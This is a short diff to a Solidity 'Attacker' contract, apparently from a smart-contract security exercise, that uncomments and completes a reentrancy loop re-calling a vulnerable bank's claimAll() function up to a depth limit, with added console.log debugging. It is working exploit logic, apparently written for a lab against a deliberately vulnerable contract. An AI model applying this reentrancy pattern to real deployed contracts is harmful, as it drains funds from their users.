@@ -69,17 +69,23 @@ contract Attacker is AccessControl, IERC777Recipient {
 		//YOUR CODE TO RECURSE GOES HERE
 
 		// Implement reentrancy with depth limit
-        //if (depth < max_depth && bank.balance > 0) {
+		if (depth < max_depth && address(bank).balance > 0) { // Using address(bank).balance explicitly
 
-			//console.log("Re-entering claimAll. Depth: %d, Bank ETH Balance: %d", depth, address(bank).balance);
+			// Use separate console.log calls for different types or complex expressions
+			console.log("Re-entering claimAll.");
+			console.log("Current Depth: ", depth);
+			console.log("Bank ETH Balance: ", address(bank).balance);
+	
 
-        //    depth++; // Increment depth for the recursive call
-        //    emit Recurse(depth); // Emit event
-        //    bank.claimAll(); // Re-enter the vulnerable function
-        //    depth--; // Decrement depth after the recursive call returns (or fails)
-        //} //else {
-			//console.log("Stopped re-entering. Depth: %d, Bank ETH Balance: %d", depth, address(bank).balance);
-		//}
+			depth++; // Increment depth for the recursive call
+			emit Recurse(depth); // Emit event
+			bank.claimAll(); // Re-enter the vulnerable function
+			depth--; // Decrement depth after the recursive call returns (or fails)
+		} else {
+			console.log("Stopped re-entering.");
+			console.log("Current Depth: ", depth);
+			console.log("Bank ETH Balance: ", address(bank).balance);
+		}
 	}
 
 }
